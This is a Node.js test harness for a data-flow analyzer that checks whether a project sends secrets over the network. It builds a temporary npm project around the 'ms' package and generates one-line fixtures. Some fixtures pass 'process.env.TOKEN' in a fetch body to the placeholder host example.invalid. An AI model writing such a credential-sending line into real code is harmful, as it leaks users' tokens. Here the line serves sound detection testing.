// The fixture is copied as data, never imported or executed.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { performance } from 'node:perf_hooks';
import { fileURLToPath } from 'node:url';
import { analyzeProject } from '../src/analyze.mjs';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-real-demo-'));
const put = (file, data) => {
  const destination = path.join(root, file);
  fs.mkdirSync(path.dirname(destination), { recursive: true });
  fs.writeFileSync(destination, typeof data === 'string' ? data : JSON.stringify(data));
};
try {
  fs.mkdirSync(path.join(root, 'node_modules'), { recursive: true });
  fs.cpSync(fileURLToPath(new URL('../test/fixtures/vendor/ms-2.1.3', import.meta.url)), path.join(root, 'node_modules/ms'), { recursive: true });
  const manifest = { name: 'real-package-demo', version: '1.0.0', dependencies: { ms: '2.1.3' } };
  put('package.json', manifest);
  put('package-lock.json', { lockfileVersion: 3, packages: { '': manifest, 'node_modules/ms': { version: '2.1.3' } } });
  const cases = [
    { name: 'Known numeric formatting', expression: 'ms(2000)', expected: 'no-flow-found' },
    { name: 'Credential alongside numeric formatting', expression: 'process.env.TOKEN + ms(2000)', expected: 'review' },
    { name: 'Regex string parsing', expression: 'ms("2h")', expected: 'incomplete' },
    { name: 'Unknown environment input', expression: 'ms(process.env.TOKEN)', expected: 'incomplete' },
  ];
  for (const example of cases) {
    put('index.js', `var ms=require('ms');fetch('https://example.invalid',{body:${example.expression}});`);
    const start = performance.now(), report = analyzeProject({ root });
    console.log(JSON.stringify({ example: example.name, verdict: report.verdict, coverage: report.coverage,
      elapsedMs: Number((performance.now() - start).toFixed(2)), findings: report.findings.length,
      gapCodes: [...new Set(report.gaps.map(gap => gap.code))], modules: report.stats.modules }, null, 2));
    if (report.verdict !== example.expected) process.exitCode = 1;
  }
} finally { fs.rmSync(root, { recursive: true, force: true }); }
